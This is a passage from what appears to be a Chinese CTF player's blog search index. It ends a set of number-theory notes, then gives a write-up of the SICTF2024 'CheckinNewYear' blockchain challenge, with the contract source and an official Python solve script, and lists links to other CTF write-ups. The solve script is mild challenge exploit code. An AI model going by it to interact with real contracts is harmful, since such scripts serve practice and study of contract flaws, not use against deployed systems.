是一个完全数</p><h4 id="σ和d的联系">σ和d的联系</h4><p>如果n是一个正整数而λ是一个非负整数，则令 <spanclass="math display">\[\sigma_\lambda(n)=\sum_{d|n}d^\lambda\]</span> 设m是一个整数，令m^0=1，我们有 <span class="math display">\[\sigma_0(n)=d(n)\]</span> 另外 <span class="math display">\[\sigma_1(n)=\sigma(n)\]</span></p><h4 id="莫比乌斯函数">莫比乌斯函数</h4><p><span class="math display">\[\mu(n)=\begin{cases} 1,当n=1时 \\ (-1)^r,当n是r个不同的素数的乘积时 \\0,当n能被一个素数的平方除尽时\end{cases}\]</span></p><h5 id="section-32">1</h5><p>如果m,n是两个正整数而gcd(m,n)=1，则我们有 <spanclass="math display">\[\mu(mn)=\mu(m)\cdot\mu(n)\]</span></p><h5 id="section-33">2</h5><p>我们有 <span class="math display">\[\sum_{d|n}\mu(d)=\begin{cases} 1,当n=1时 \\ 0,当n&gt;1时\end{cases}\]</span></p><h5 id="section-34">3</h5><p>设n=p1<sup>α1...pm</sup>αm，其中p1,...pm是m个不同的素数，而α1,...,αm都是正整数，则我们有<span class="math display">\[\sum_{d|n}|\mu(d)|=2^m\]</span></p><h2 id="第八章-关于复数和三角和的概念">第八章关于复数和三角和的概念</h2><h3 id="三角函数泰勒公式">三角函数泰勒公式</h3><p>这里贴一下三角函数泰勒公式<imgsrc="/images/《初等数论》学习笔记/image-20240303175243666.png"alt="image-20240303175243666" /></p><figure><img src="/images/《初等数论》学习笔记/image-20240303175252488.png"alt="image-20240303175252488" /><figcaption aria-hidden="true">image-20240303175252488</figcaption></figure><h3 id="欧拉公式">欧拉公式</h3><p><span class="math display">\[e^{i\theta}=cos\theta+isin\theta\]</span></p><p>并且由此可以推知， <span class="math display">\[|e^{i\theta}|=\sqrt{cos^2\theta+sin^2\theta}=1\]</span></p><h3 id="负数的指数式">负数的指数式</h3><p>根据上面的欧拉公式，复数z=r(cosθ+isinθ)可以表示为简单形式 <spanclass="math display">\[z=re^{i\theta}\]</span></p><h3 id="一些结论-5">一些结论</h3><h4 id="section-35">1</h4><p>设θ1和θ2是两个实数，则我们有 <span class="math display">\[e^{i(\theta_1+\theta_2)}=e^{i\theta_1}\cdot e^{i\theta_2}\]</span></p><h4 id="section-36">2</h4><p>设n是一个正整数而z=a+bi是一个复数，则当z≠1时我们有 <spanclass="math display">\[\sum_{m=0}^n{z^m}=\frac{1-z^{n+1}}{1-z}\]</span></p><h4 id="section-37">3</h4><p>我们有 <span class="math display">\[\sum_{m=0}^{n-1}{e^{i(\theta+\frac{n-1}{2}\varphi)}}\cdot\frac{sin\frac{n\varphi}{2}}{sin\frac{\varphi}{2}}\]</span> 其中n是一个正整数，φ≠2lπ，其中l是任一个整数，即{φ/2x}≠0</p><h2 id="也许暂时的结尾">（也许暂时的）结尾</h2><p>以上是本人读了前两册《初等数论》后记录的笔记。第二册的三角和部分及最后一册暂且先不读了，以后有需要再读了做补充。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次上链</title>
      <link href="/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/"/>
      <url>/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于SICTF2024 #Round 3 Blockchain方向的CheckinNewYear</p><p>当时这题没做出来，现在根据official writeup进行了一次复盘（</p></blockquote><h2 id="题目">题目</h2><p><img src="/images/记第一次上链/屏幕截图 2024-02-22 235215.png" alt="屏幕截图 2024-02-22 235215" style="zoom:50%;" /></p><p>如何注册使用metamask这里不再赘述，remixIDE网站：https://remix.ethereum.org/</p><p>先生成一个deployer account:</p><figure><img src="/images/记第一次上链/image-20240223012955732.png"alt="image-20240223012955732" /><figcaption aria-hidden="true">image-20240223012955732</figcaption></figure><p>按照要求给这个账户去水龙头接点水，不然就会无法支付2中部署合约时产生的费用</p><figure><img src="/images/记第一次上链/image-20240223013024832.png"alt="image-20240223013024832" /><figcaption aria-hidden="true">image-20240223013024832</figcaption></figure><p>部署一下题目的智能合约，得到合约地址和token</p><figure><img src="/images/记第一次上链/image-20240223013113909.png"alt="image-20240223013113909" /><figcaption aria-hidden="true">image-20240223013113909</figcaption></figure><p>用4查看一下合约的源代码</p><p><img src="/images/记第一次上链/屏幕截图 2024-02-23 004703.png" alt="屏幕截图 2024-02-23 004703" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        2**16 * 3**3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 ==</span><br><span class="line">        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959</span><br><span class="line">        ,&quot;Not this Year&quot;);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (bool)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(&quot;Happy&quot;)),&quot;not HappyNewYear&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码逻辑，发现其中对用户的地址有限制。这里用两串较长的式子进行了简单的混淆，经过计算不难发现，这里的限制是要求用户地址的最后四位是2024。</p><p>在这里，officialwriteup中给出了一个可以专门用来生成指定形式地址的网站：https://vanity-eth.tk/</p><blockquote><p>比赛期间做的时候就是卡在这里了，学长发了我exp.sol我都不会用。。。没想到其实有这么方便的网站~（T0T)</p></blockquote><figure><img src="/images/记第一次上链/image-20240223183457544.png"alt="image-20240223183457544" /><figcaption aria-hidden="true">image-20240223183457544</figcaption></figure><p>接下来只要给isSolved函数的NewYear值传一个"Happy"字符串就可以了</p><h2 id="python编写exp">python编写exp</h2><p>官方给出的exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> compile_file</span><br><span class="line">entrant_abi, entrant_bytecode = compile_file(<span class="string">&quot;Example.sol&quot;</span>, <span class="string">&quot;HappyNewYear&quot;</span>,</span><br><span class="line"><span class="string">&quot;0.8.9&quot;</span>)[<span class="string">&#x27;HappyNewYear&#x27;</span>]  <span class="comment">#确保Example.sol跟这个py文件在同一路径下</span></span><br><span class="line">conn = Connection(<span class="string">&#x27;http://124.221.86.119:40002&#x27;</span>)</span><br><span class="line">existing_account =conn.account(<span class="string">&quot;...&quot;</span>)  <span class="comment">#这里是填写上面生成的账号的Private Key</span></span><br><span class="line">target_address = <span class="string">&quot;0x3C58Ec40D7E79BEf9c7987b7c5414b0B13CcEDEe&quot;</span>  <span class="comment">#合约地址</span></span><br><span class="line">entrant_contract = conn.contract(</span><br><span class="line">existing_account,</span><br><span class="line">address=target_address,</span><br><span class="line">abi=entrant_abi</span><br><span class="line">)</span><br><span class="line">entrant_contract.functions.happyNewYear(<span class="string">&quot;Happy&quot;</span>).send_transaction()</span><br></pre></td></tr></table></figure><p>成功运行以后只要去nc的3中查看即可</p><figure><img src="/images/记第一次上链/image-20240223010429906.png"alt="image-20240223010429906" /><figcaption aria-hidden="true">image-20240223010429906</figcaption></figure><h2 id="remix">remix</h2><p>新进一个test.sol文件，把得到的合约源码复制进去</p><figure><img src="/images/记第一次上链/image-20240223010958373.png"alt="image-20240223010958373" /><figcaption aria-hidden="true">image-20240223010958373</figcaption></figure><p>编译一下，注意compiler的版本，绿色的√出现即为编译成功</p><figure><img src="/images/记第一次上链/image-20240223011101264.png"alt="image-20240223011101264" /><figcaption aria-hidden="true">image-20240223011101264</figcaption></figure><p>在metamask上手动添加网络，网络名称随便写，RPC题目中的复制过来（记得加上http），链ID随便写，保存的时候它会教你做事，货币符号随便写</p><blockquote><p>由于之前做题的时候添加过了，这里有个报错</p></blockquote><p><img src="/images/记第一次上链/image-20240223011626597.png" alt="image-20240223011626597" style="zoom:50%;" /></p><p>在添加账户中导入账户，填写上面生成的账户的Private Key</p><p><img src="/images/记第一次上链/image-20240223011806125.png" alt="image-20240223011806125" style="zoom:50%;" /></p><p>开始将智能合约部署上链，ENVIRONMENT选Inject Provider -MetaMask，确保自己连入的是那个2024结尾的账户（点那个地球的标志查看），AtAddress填入合约地址，然后点一下AtAddress，给happyNewYear传一个Happy，然后点一下happyNewYear，确认交易，大功告成！</p><p><img src="/images/记第一次上链/image-20240223012042008.png" alt="image-20240223012042008" style="zoom:50%;" /></p><figure><img src="/images/记第一次上链/image-20240223012345867.png"alt="image-20240223012345867" /><figcaption aria-hidden="true">image-20240223012345867</figcaption></figure><p><img src="/images/记第一次上链/image-20240223012407277.png" alt="image-20240223012407277" style="zoom:50%;" /></p><p>nc一下查看3即可看到flag</p><figure><img src="/images/记第一次上链/image-20240223010429906.png"alt="image-20240223010429906" /><figcaption aria-hidden="true">image-20240223010429906</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round3 Writeup</title>
      <link href="/2024/02/19/SICTF2024-Writeup/"/>
      <url>/2024/02/19/SICTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/SICTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>"[签到]签到" and "WHO?WHO?WHO" in "Misc", "[Game][Battle City]" in"Reverse" ,and "Forensics" was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2024 Writeup</title>
      <link href="/2024/02/06/HGame2024-Writeup/"/>
      <url>/2024/02/06/HGame2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="week1-writeup"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week1_Writeup.pdf">Week1Writeup</a></h4><h4 id="week2-writeup"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week2_Writeup.pdf">Week2Writeup</a></h4><h4 id="week3-writeup"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week3_Writeup.pdf">Week3Writeup</a></h4><h4 id="week4-writeup"><ahref="https://www.blog.st4rr.top/writeups/HGame2024_Week4_Writeup.pdf">Week4Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024 Writeup</title>
      <link href="/2024/02/06/BeginCTF2024-Writeup/"/>
      <url>/2024/02/06/BeginCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/BeginCTF2024_Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023 Writeup</title>
      <link href="/2024/01/24/NCTF2023-Writeup/"/>
      <url>/2024/01/24/NCTF2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/NCTF2023_Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>"Web" was written by <strong>wuming</strong></p><p>"Reverse" was written by <strong>fermata</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 Writeup</title>
      <link href="/2024/01/24/0xGame2023-Writeup/"/>
      <url>/2024/01/24/0xGame2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="week1-writeup"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week1_Writeup.pdf">Week1Writeup</a></h4><h4 id="week2-writeup"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week2_Writeup.pdf">Week2Writeup</a></h4><h4 id="week3-writeup"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week3_Writeup.pdf">Week3Writeup</a></h4><h4 id="week4-writeup"><ahref="https://www.blog.st4rr.top/writeups/0xGame2023_Week4_Writeup.pdf">Week4Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, world!</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to my site, everybodyyyyy!</p><p>我是St4rr，一个刚刚入门的网安新手。最近在<del>当一个赛棍</del>打CTF，目前是X1cT34m和Polaris的一个misc手，也稍微（真的很稍微！）懂一点点crypto。希望未来能再了解点web，对web真的是一窍不通。。。</p><p>虽然现在还是一个realvegetable，但是有句老话说的好，菜就多练。。。现阶段想先多参加点比赛，并多向师傅们学习，争取多练点技术出来吧。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Comment</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
